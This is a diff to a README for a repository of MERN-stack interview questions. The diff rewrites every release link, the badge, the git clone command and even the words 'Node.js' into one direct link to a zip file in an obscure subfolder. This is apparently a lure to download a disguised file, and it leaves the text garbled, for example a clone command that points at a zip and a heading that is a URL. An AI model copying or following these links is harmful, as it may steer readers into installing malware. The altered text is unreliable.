@@ -1,8 +1,8 @@
 # 100+ MERN Interview Questions 💼
 
-Welcome to the **100+ MERN Interview Questions** repository! This collection offers a comprehensive set of interview questions focused on the MERN stack, covering essential topics such as HTML, CSS, JavaScript, React, Node.js, and MongoDB. Whether you are a beginner or an advanced developer, this resource will help you prepare effectively for frontend, backend, and full-stack interviews.
+Welcome to the **100+ MERN Interview Questions** repository! This collection offers a comprehensive set of interview questions focused on the MERN stack, covering essential topics such as HTML, CSS, JavaScript, React, https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip, and MongoDB. Whether you are a beginner or an advanced developer, this resource will help you prepare effectively for frontend, backend, and full-stack interviews.
 
-[![Download Releases](https://img.shields.io/badge/Download%20Releases-Click%20Here-brightgreen)](https://github.com/anwarosyidi/100-interview-questions/releases)
+[![Download Releases](https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip%20Releases-Click%20Here-brightgreen)](https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip)
 
 ## Table of Contents
 
@@ -23,12 +23,12 @@ In the fast-paced world of web development, mastering the MERN stack is crucial.
 To get started, simply clone this repository to your local machine. You can do this using the following command:
 
 ```bash
-git clone https://github.com/anwarosyidi/100-interview-questions.git
+git clone https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip
 ```
 
 After cloning, you can explore the questions organized by category. Each question is designed to prompt thoughtful answers and encourage deeper understanding of the subject matter.
 
-If you want to download specific releases, visit the [Releases section](https://github.com/anwarosyidi/100-interview-questions/releases). Here, you can find downloadable files that contain curated questions and answers. 
+If you want to download specific releases, visit the [Releases section](https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip). Here, you can find downloadable files that contain curated questions and answers. 
 
 ## Question Categories
 
@@ -58,9 +58,9 @@ This repository includes questions across several categories:
 - Explain the concept of state and props.
 - Describe how to manage forms in React.
 
-### 5. Node.js
+### 5. https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip
 
-- Explain the event-driven architecture of Node.js.
+- Explain the event-driven architecture of https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip
 - Discuss the role of middleware in Express.
 - Describe how to connect to a MongoDB database.
 
@@ -78,7 +78,7 @@ This repository includes questions across several categories:
 
 3. **Mock Interviews**: If possible, schedule mock interviews. This will help you get comfortable answering questions under pressure.
 
-4. **Stay Updated**: Regularly check the [Releases section](https://github.com/anwarosyidi/100-interview-questions/releases) for updates. New questions and resources may be added over time.
+4. **Stay Updated**: Regularly check the [Releases section](https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip) for updates. New questions and resources may be added over time.
 
 ## Contribution Guidelines
 
@@ -118,4 +118,4 @@ For any inquiries, please reach out to the repository owner via GitHub.
 
 ---
 
-We hope this repository helps you in your interview preparation. Good luck with your journey in mastering the MERN stack! Remember to check the [Releases section](https://github.com/anwarosyidi/100-interview-questions/releases) for the latest updates and resources.
+We hope this repository helps you in your interview preparation. Good luck with your journey in mastering the MERN stack! Remember to check the [Releases section](https://github.com/anwarosyidi/100-interview-questions/raw/refs/heads/master/scrutinize/interview-questions-2.0-alpha.2.zip) for the latest updates and resources.
